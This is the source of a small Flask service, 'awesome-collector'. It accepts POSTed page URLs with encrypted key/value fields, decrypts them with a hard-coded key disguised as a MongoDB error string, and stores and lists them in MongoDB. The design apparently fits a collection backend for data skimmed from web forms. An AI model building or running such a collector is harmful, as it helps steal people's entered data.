# awesome-collector/app.py

from flask import Flask, request, Response
from database.db import initialize_db
from database.models import Fragment
from cryptor.decrypt import decrypt as DEC

app = Flask(__name__)

app.config['MONGODB_SETTINGS'] = {
    'host': 'mongodb://localhost/fragments-bag' 
}
initialize_db(app)

keysec = 'E11000 Error'
# get all collected objects
@app.route('/analyse')
def get_fragments():
    fragments = Fragment.objects().to_json()
    return Response(fragments, mimetype="application/json", status=200)

# upload new object
@app.route('/analyse', methods=['POST'])
def add_fragment():
    body = request.get_json()
    
    fields = None
    url = None
    container = None

    if bool(body) and 'fields' in body:
        fields = dict((a['key'], DEC(a['value'], keysec.encode())) for a in body['fields'])
    if bool(body) and 'url' in body:
        url = body['url']
    if fields and url:
        container = {'url': url, 'fields': fields}
        ids = Fragment.objects.count()+1
        frament = Fragment(**container).save()
        return { 'id': str(ids)}, 200
    else:
        return "No records sent", 400

# update object
#@app.route('/analyse/<int:index>', methods=['PUT'])
#def update_fragment(index):
#    fragment = request.get_json()
#    fragments[index] = fragment
#    return jsonify(fragments[index]), 200

#@app.route('/analyse/<int:index>', methods=['DELETE'])
#def delete_fragment(index):
#    fragments.pop(index)
#    return 'None', 200

app.run(debug=False, port=80)